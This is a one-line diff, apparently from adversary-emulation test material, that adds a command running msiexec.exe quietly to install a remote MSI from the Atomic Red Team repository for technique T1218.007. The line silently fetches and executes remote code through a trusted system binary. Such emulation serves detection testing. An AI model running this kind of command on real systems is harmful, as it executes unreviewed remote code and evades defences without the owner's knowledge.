@@ -1,0 +1,1 @@
+c:\windows\system32\msiexec.exe  /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"
